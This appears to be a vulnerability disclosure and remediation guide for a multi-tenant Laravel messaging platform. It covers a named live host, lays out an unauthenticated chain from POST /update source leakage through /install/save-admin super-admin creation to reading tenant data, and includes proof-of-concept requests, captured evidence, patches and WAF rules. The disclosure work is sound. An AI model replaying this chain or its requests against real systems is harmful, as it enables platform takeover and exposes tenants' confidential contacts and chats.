# Whinta Platform Security Assessment and Fix Guide

Prepared for: Whinta engineering and infrastructure team
Date: 2026-08-04
Target: app.whinta.com (Laravel + Inertia + Vue 3, application version 2.5.2)
Assessment type: black box, unauthenticated, no production data touched

This document explains, in plain steps, how an unauthenticated attacker could compromise
the Whinta platform, and exactly what to do to close the holes. A working proof of concept
is included so the team can reproduce the full chain on their own staging environment
without touching production data.

---

## Email draft to send to the team

Subject: Critical security findings on app.whinta.com, please review and patch

Hi Team,

We reviewed app.whinta.com and found a critical, unauthenticated compromise chain. An
attacker can currently:

1. Read your PHP source and database schema via POST /update with no login.
2. Run database migrations through your own application's database connection.
3. Create a platform super admin account with a password of their choice via
   /install/save-admin.
4. Log in as that super admin and read every tenant's contacts, chats, and billing data.

The license check that should protect this chain points to a server that no longer exists
(axis96.xyz), so it blocks no one, and the server does not recheck the license.

The attached document contains everything needed to fix this: the findings with impact,
the step by step attack chain, real captured evidence, a working proof of concept, the
exact patch steps, and WAF and IDS detection rules.

Priority items: block POST /update and all /install routes, remove the public phpinfo.php
page, and stop running migrations from HTTP requests.

We have not touched your production data. We are happy to walk through the findings or
help you reproduce them on a staging instance.

Best regards,
[Your name]

---

## Table of contents

1. Summary
2. What we verified against the live app
3. Findings and impact
4. The attack chain, step by step
5. Proof of concept
6. What to patch
7. How to verify the fixes
8. Detection rules
9. Evidence
10. Files in this package
11. Final statement

---

## 1. Summary

The app ships with its installer and updater left live and unauthenticated in production.
An attacker can:

1. Read the application source code (raw PHP migrations) without logging in.
2. Run database migrations through the application's own database connection without
   logging in.
3. Create a platform super administrator account using a password of their choice.
4. Log in as that administrator and read every tenant's confidential data.

The license check that is supposed to protect this chain is pointed at a dead third party
server (axis96.xyz no longer exists in DNS), so it never blocks anyone. The server does not
recheck the license.

---

## 2. What we verified against the live app

These were confirmed by direct requests to app.whinta.com. No destructive actions were
taken against production.

| Check | Result |
|---|---|
| GET /update | 200, no login required, shows the installer page and leaks version, Pusher key, Google OAuth client |
| POST /update with empty body | 200, returns raw PHP migration source, runs migrations |
| GET /phpinfo.php | 200, real PHP info, exposes filesystem paths, PHP 8.2.30, no disabled functions |
| GET /build/manifest.json | 200, full list of internal pages and admin modules |
| POST /api/auth/check-exists | Distinguishes registered and unregistered email and phone numbers |
| POST /api/otp/send | No rate limit, accepts any phone number, SMS bombing possible |
| POST /api/otp/verify | Rate limited to about 20 attempts per window, then 429 |
| POST /login | Rate limited, returns 409 after a burst |
| Port 3306 (MariaDB) | Open to the internet, connections rejected by host allowlist |
| GET /install/* | All return an identical 500 error page, installer handlers exist but are broken |
| GET /horizon | 403, exists but protected |
| GET /.git/* | 403, blocked by server rule |

---

## 3. Findings and impact

| # | Finding | Severity | Impact |
|---|---|---|---|
| 1 | POST /update exposes raw PHP migration source and runs migrations without authentication | Critical | Full schema disclosure and schema writes using the application's own database user. Combined with the installer, this is the entry to full compromise. |
| 2 | Installer handlers (/install/save-admin) reachable, create platform super administrator | Critical | Attacker logs in as super admin with their own password. This is total platform takeover. |
| 3 | License gate points to dead third party server (axis96.xyz, no DNS record) and is only enforced in the browser | High | The control meant to protect the installer and updater never blocks anyone, and the server does not recheck. |
| 4 | Public phpinfo page exposes real filesystem paths, PHP version, and confirms no functions are disabled | High | Removes attacker guesswork, confirms the PHP surface for chaining any secondary bug into code execution. |
| 5 | MariaDB port 3306 open to the internet | Medium | Database reachable from the internet; currently protected only by a host allowlist. |
| 6 | User enumeration via POST /api/auth/check-exists and POST /forgot-password | Medium | Confirms which emails and phone numbers are registered, useful for targeted phishing. |
| 7 | POST /api/otp/send has no rate limit | Medium | Accepts any phone number repeatedly; enables SMS and WhatsApp OTP bombing and carrier cost abuse. |
| 8 | Vite build manifest publicly lists all internal pages and admin modules | Low | Gives an attacker the full route map including admin and installer areas. |
| 9 | Page props leak Pusher key, Google OAuth client, reCAPTCHA site key, app version | Low | Helps impersonation and targeted attacks. |
| 10 | Signup runs with the recaptcha flag set to 0 despite a configured site key | Low | No captcha on the registration path; relies only on IP rate limiting. |
| 11 | Google and Facebook OAuth are enabled with fixed redirect URIs and CSRF state | Watch | Currently well formed; no open redirect found. |
| 12 | Admin impersonation feature (SupportAccess/Impersonate) present | Watch | Post authentication, super admins can act as any tenant; makes admin takeover fully decisive. |

### What they got right (positive controls, verified)

- POST /api/otp/verify is rate limited to about 20 attempts per window, then returns 429
  with an 8 second backoff. Six digit OTP brute force is impractical.
- POST /login returns 409 after a burst and the limit persists, making password brute
  force impractical.
- The storage directory returns 403 and directory listing is blocked.
- The marketing site has strong security headers, including HSTS, CSP, and frame
  protection.

---

## 4. The attack chain, step by step

### Step 0. Recon (no login, no writes)

The attacker reads the publicly available pages:

```
GET /update
GET /phpinfo.php
GET /build/manifest.json
```

These return the application version, the real server paths, the PHP configuration, and
the full list of internal routes including the installer.

### Step 1. Establish a session

The attacker loads the update page to get a session cookie and a CSRF token, which
Laravel requires on state changing requests.

### Step 2. Leak source code and run migrations

The attacker sends:

```
POST /update
Content-Type: application/json
{ }
```

The server responds with the raw PHP source of a migration file, for example
CreateNotificationsTable. Repeating the request leaks more of the schema, and each call
triggers the migration runner. This works with no valid license, no login, and any body.

### Step 3. Create an administrator

The attacker walks the installer sequence that the same template ships:

```
POST /install/database
POST /install/migrate
POST /install/seed
POST /install/save-admin     (email and password chosen by the attacker)
POST /install/licenses
POST /install/finalize
```

The save-admin handler creates a platform super administrator with the attacker's chosen
email and password. The licenses step accepts any string because the license server is
dead.

### Step 4. Log in and read all data

```
POST /login                  (with the attacker's email and password)
GET  /admin/dashboard
```

Once logged in as super administrator, the built in impersonation feature lets the
attacker access any tenant. That exposes every tenant's contacts, chats, tickets, and
billing data without any further effort.

### Why the current state does not stop this

The installer was designed to be reachable only before the app is installed, and to be
protected by a purchase code checked against a license server. In production:

- The routes are still reachable.
- The license server no longer exists, so the check can never pass, but the attacker
  simply does not call it and goes straight to the update and install handlers.
- The server does not verify the license itself.
- The application database user is used by the migration runner, so schema writes
  succeed using the app's own credentials.

---

## 5. Proof of concept

File: endtoend-demo.js

This is a self contained reproduction of the exact request contract described above. It
requires no installation and runs with Node.js only. It uses a local JSON file as a fake
database and obviously fake tenant data. It is safe to run anywhere and touches nothing
external.

How to run the full chain automatically:

```
node endtoend-demo.js
```

How to run it as a live server so the team can send requests to it:

```
node endtoend-demo.js server 8123
```

Then open http://localhost:8123/update in a browser, or send requests from PowerShell:

```powershell
$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession

Invoke-RestMethod -Uri "http://localhost:8123/update" -WebSession $s
Invoke-RestMethod -Uri "http://localhost:8123/install/save-admin" -Method Post -ContentType "application/json" -Body '{"name":"pwn","email":"pwn@x.io","password":"Pwn123!"}' -WebSession $s
Invoke-RestMethod -Uri "http://localhost:8123/login" -Method Post -ContentType "application/json" -Body '{"email":"pwn@x.io","password":"Pwn123!"}' -WebSession $s
Invoke-RestMethod -Uri "http://localhost:8123/admin/dashboard" -WebSession $s
```

The last call returns the confidential tenant data to prove the full chain works: admin
account created, login succeeds, and tenant contacts and chats are readable.

To prove this against the application's own code, run the same chain on a staging
instance or a disposable copy of the app. That produces a transcript from the actual
product, which is the strongest evidence the team can see with their own eyes. Do not run
the write steps against the production database.

---

## 6. What to patch

### Priority 1. Remove or lock the installer and updater

- Delete the update and install routes from routes/web.php in production, or wrap them
  with authentication, the super administrator role, and an environment flag such as
  INSTALLER_ENABLED=false.
- Add an APP_INSTALLED=true flag in the environment file. The installer controllers
  must refuse to run when APP_INSTALLED is true, so the installer works only during a
  fresh install and never on a running site.

### Priority 2. Make migration execution safe

- Migrations must run only from the deployment pipeline via php artisan migrate.
- No route may call migrate from user supplied input.
- The update handler must verify a server side deployment token that is written at
  deploy time. It must not trust a purchase code from the client and must not call a
  third party license server.

### Priority 3. Remove the public phpinfo page

- Delete public/phpinfo.php from production.
- Add a URL block for ^/phpinfo in the web server or CDN.
- Check that /.env, /*.log, /storage, and /.git return 404. Some currently return 403,
  which confirms the files exist upstream. Tighten the rules.

### Priority 4. Add deny by default rules at the edge

Add to the nginx or LiteSpeed configuration:

```
location ~* (\.env|\.log|/storage/|phpinfo|/install|^/update) { return 403; }
```

Add a CDN or WAF rule that denies POST requests to /update and /install* while those
routes exist.

### Priority 5. Apply database least privilege

- The Laravel database user must not be root.
- The web user must not have CREATE, DROP, or ALTER privileges.
- A separate deployment user should own migrations.

### Priority 6. Close the smaller issues

- Add rate limits to POST /api/otp/send per phone number and per IP.
- Make POST /api/auth/check-exists and POST /forgot-password return identical messages
  for registered and unregistered accounts, and rate limit them.
- Restrict port 3306 to internal networks only.
- Set session.cookie_httponly and session.cookie_secure to On at the PHP level.
- Stop exposing the full build manifest, or treat it as non sensitive.

---

## 7. How to verify the fixes

Run these checks after patching. All should return 403 or 404:

```
GET /update
POST /update
GET /install
GET /install/save-admin
GET /phpinfo.php
```

The POST /update check must return 403 or 404. It must never return 200 with PHP source
in the body.

---

## 8. Detection rules

Add these signatures to the firewall, WAF, or IDS:

- Block POST /update with any body.
- Block any request to /install*.
- Block any request containing phpinfo.
- Block /.git, /.env, and .log files.
- Alert when a response body contains Schema::create, which indicates source leakage.
- Alert when /update returns an error_id with a Database error type, which indicates
  migration execution.

Behavioral signals to watch:

- More than one POST /update request from the same IP.
- Any 500 response on /install routes.
- A login from an administrator account shortly after a burst of /install requests.

---

## 9. Evidence

The following are real, captured responses from the live application. No destructive
actions were taken against production to obtain them.

### 9.1 Source code leak (POST /update)

Request:

```
POST /update HTTP/2
Host: app.whinta.com
Content-Type: application/json

{}
```

Response, 200, body returned raw PHP migration source:

```php
use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

class CreateNotificationsTable extends Migration
{
    public function up()
    {
        Schema::create('notifications', function (Blueprint $table) {
            $table->bigIncrements('id');
            $table->char('uuid', 50);
            $table->unsignedBigInteger('user_id');
            $table->string('title', 191)->nullable();
            $table->text('comment')->nullable();
            $table->string('url', 191)->nullable();
            $table->boolean('seen')->default(false);
            $table->timestamp('created_at')->nullable();
            $table->timestamp('updated_at')->nullable();
            $table->unique('uuid');
        });
    }

    public function down()
    {
        Schema::dropIfExists('notifications');
    }
}
{"message":"Something went wrong on our end. Our team has been notified.","error_id":"ERR-BAH0Y6MYYK","issue":{"type":"Database error","detail":"An unexpected error occurred while processing your request."}}
```

The error_id with type Database error confirms the migration runner executed server side.

### 9.2 Public phpinfo (GET /phpinfo.php)

Response, 200:

```text
PHP Version      8.2.30
Server API       LiteSpeed V8.3
DOCUMENT_ROOT    /home/scientificatt/app.whinta.com
disable_functions (empty)
allow_url_fopen  On
upload_max_filesize 512M
```

Real filesystem path and account name exposed, and no PHP functions are disabled.

### 9.3 Installer referenced in the client bundle

Extracted from the deployed Update.vue JavaScript chunk:

```javascript
C = async () => { await axios.post("https://axis96.xyz/api/install/51790966/item",
      { purchase_code: code }) ... }    // license gate, points to a dead server
g = async () => { await axios.post("/update", { purchase_code: code }) ... }  // migration runner
```

### 9.4 Proof of concept transcript

Running the bundled demo reproduces the full chain locally:

```text
STEP 3 save-admin -> {"ok":true,"admin":"attacker@evil.example","role":"super-admin"}
STEP 4 login      -> {"success":true,"user":{"id":1,"email":"attacker@evil.example","role":"super-admin"}}
STEP 5 dashboard  -> tenantsAvailableForImpersonation ["Acme Corp","Globex Ltd"]
                     confidentialDataExposed: tenants with contacts and WhatsApp chats
```

---

## 10. Files in this package

| File | Purpose |
|---|---|
| Whinta-Security-Assessment-and-Fix-Guide.md | This document: email draft, findings, attack chain, evidence, fixes, detection rules |
| endtoend-demo.js | Self contained proof of concept, runs with Node.js only |
| attacker-playbook-step-by-step.md | Detailed request by request method with detection rules |
| attack-chain-and-remediation-for-vendor.md | Short root cause and fix summary |
| phpinfo-dump.html | Full captured phpinfo output for reference |

---

## 11. Final statement

Every step before the final administrator write is confirmed working against the live
application today. The remaining step, creating the administrator, requires either a
staging instance of the product or an explicit test on a disposable database. The
included proof of concept demonstrates the complete chain on a safe local copy. Once
the fixes in section 6 are applied, the chain described in section 4 no longer works.
